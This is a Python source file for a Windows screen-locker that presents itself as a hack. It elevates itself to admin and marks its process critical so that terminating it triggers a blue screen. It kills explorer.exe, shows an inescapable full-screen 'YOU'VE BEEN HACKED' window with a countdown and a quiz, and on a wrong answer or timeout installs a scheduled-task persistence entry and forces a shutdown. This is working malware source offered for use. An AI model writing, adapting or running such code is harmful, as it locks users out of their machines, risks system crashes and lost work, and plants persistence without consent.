import tkinter as tk
from tkinter import messagebox
import sys
import subprocess
import ctypes
import os
import platform

# Config
BSOD_ON_KILL = True 
QUIZ_QUESTION = "what year did John F. Kennedy die?"
QUIZ_ANSWER = "1963"
TIME_LIMIT_MINUTES = 30
TASK_NAME = "SecurityCheck"

# DLL
user32 = ctypes.windll.user32
kernel32 = ctypes.windll.kernel32
ntdll = ctypes.windll.ntdll

def add_to_startup():
    # ฝัง Startup (ทำงานเมื่อถูกเรียก)
    if getattr(sys, 'frozen', False):
        exe_path = sys.executable
    else:
        exe_path = os.path.abspath(sys.argv[0])

    command = f'schtasks /create /tn "{TASK_NAME}" /tr "\'{exe_path}\'" /sc onlogon /rl highest /f'

    try:
        if ctypes.windll.shell32.IsUserAnAdmin():
            subprocess.run(command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            print(f"[TRAP ACTIVATED] Persistence installed: {TASK_NAME}")
    except Exception as e:
        print(f"[ERROR] Persistence failed: {e}")

def remove_from_startup():
    # ลบ Startup (ทำงานเมื่อตอบถูก)
    command = f'schtasks /delete /tn "{TASK_NAME}" /f'
    try:
        if ctypes.windll.shell32.IsUserAnAdmin():
            subprocess.run(command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            print(f"[TRAP REMOVED] Persistence deleted: {TASK_NAME}")
    except:
        pass

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def run_as_admin():
    if not is_admin():
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        sys.exit(0)

def set_process_critical(enable=True):
    if not BSOD_ON_KILL: return
    try:
        PROCESS_BREAK_ON_TERMINATION = 0x1D
        TOKEN_ADJUST_PRIVILEGES = 0x0020
        TOKEN_QUERY = 0x0008
        SE_DEBUG_NAME = "SeDebugPrivilege"
        
        h_token = ctypes.c_void_p()
        luid = ctypes.c_int64()
        prev = ctypes.c_bool()
        
        kernel32.OpenProcessToken(kernel32.GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, ctypes.byref(h_token))
        ctypes.windll.advapi32.LookupPrivilegeValueW(None, SE_DEBUG_NAME, ctypes.byref(luid))
        ntdll.RtlAdjustPrivilege(20, 1, 0, ctypes.byref(prev))

        value = ctypes.c_ulong(1 if enable else 0)
        ntdll.NtSetInformationProcess(-1, PROCESS_BREAK_ON_TERMINATION, ctypes.byref(value), ctypes.sizeof(value))
    except Exception as e:
        pass

def kill_explorer():
    subprocess.run("taskkill /F /IM explorer.exe", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def start_explorer():
    subprocess.Popen("explorer.exe", shell=True)

class LockScreen:
    def __init__(self, root):
        self.root = root
        self.root.title("System Halted")
        self.root.configure(background='black', cursor="none") 

        self.root.attributes("-fullscreen", True)
        self.root.attributes("-topmost", True)
        self.root.overrideredirect(True)
        
        self.root.protocol("WM_DELETE_WINDOW", self.anti_close)
        self.root.bind("<Alt-F4>", lambda e: "break")
        self.root.bind("<Control-Alt-Delete>", lambda e: "break")
        self.root.bind("<Tab>", lambda e: "break")
        self.root.bind("<Alt-Shift-Escape>", self.dev_exit)
        
        self.time_left = TIME_LIMIT_MINUTES * 60
        self.setup_ui()
        self.root.after(100, self.keep_focus)
        self.update_timer()

    def setup_ui(self):
        frame = tk.Frame(self.root, bg="black")
        frame.pack(expand=True)
        
        tk.Label(frame, text="⚠ YOU'VE BEEN HACKED ⚠", font=("Impact", 40), fg="red", bg="black").pack(pady=20)
        tk.Label(frame, text=QUIZ_QUESTION, font=("Consolas", 18), fg="#00ff00", bg="black").pack(pady=20)
        
        self.user_input = tk.Entry(frame, font=("Consolas", 24), justify='center', bg="#222", fg="white", insertbackground="white")
        self.user_input.pack(pady=20, ipady=5)
        self.user_input.bind("<Return>", lambda event: self.check_answer())
        self.user_input.focus_set()

        tk.Button(frame, text="UNLOCK", command=self.check_answer, font=("Consolas", 14, "bold"), bg="red", fg="white").pack(pady=20)

        right_frame = tk.Frame(self.root, bg="black", highlightbackground="red", highlightthickness=2)
        right_frame.place(relx=0.98, rely=0.05, anchor="ne") 

        tk.Label(right_frame, text="YOU WILL DEAD IN", font=("Consolas", 12, "bold"), fg="yellow", bg="black").pack(padx=10, pady=(10, 0))

        self.timer_label = tk.Label(right_frame, text="00:00", font=("Consolas", 30, "bold"), fg="red", bg="black")
        self.timer_label.pack(padx=10, pady=10)

    def update_timer(self):
        mins, secs = divmod(self.time_left, 60)
        time_str = f"{mins:02}:{secs:02}"
        
        self.timer_label.config(text=time_str)
        
        if self.time_left > 0:
            self.time_left -= 1
            self.root.after(1000, self.update_timer)
        else:
            self.punish()

    def keep_focus(self):
        try:
            self.root.lift()
            self.root.focus_force()
            self.user_input.focus_set()
        except:
            pass
        self.root.after(500, self.keep_focus)

    def check_answer(self):
        ans = self.user_input.get().strip()
        if ans.lower() == QUIZ_ANSWER.lower():
            self.unlock()
        else:
            self.punish()

    def punish(self):
        # [แก้ไขจุดที่ 1] ตอบผิด -> ฝัง Startup ก่อนตาย
        add_to_startup()
        
        set_process_critical(False)
        subprocess.run("shutdown /s /t 0 /f", shell=True)
        sys.exit(0)

    def unlock(self):
        # [แก้ไขจุดที่ 2] ตอบถูก -> ลบ Startup ทิ้ง
        remove_from_startup()
        
        set_process_critical(False)
        start_explorer() 
        self.root.destroy()
        sys.exit(0)

    def anti_close(self):
        ctypes.windll.user32.MessageBeep(0xFFFFFFFF)

    def dev_exit(self, event):
        if messagebox.askyesno("Dev", "Exit?"):
            self.unlock()

if __name__ == "__main__":
    run_as_admin()
    set_process_critical(True)
    kill_explorer()
    try:
        root = tk.Tk()
        app = LockScreen(root)
        root.mainloop()
    except:
        set_process_critical(False)
        start_explorer()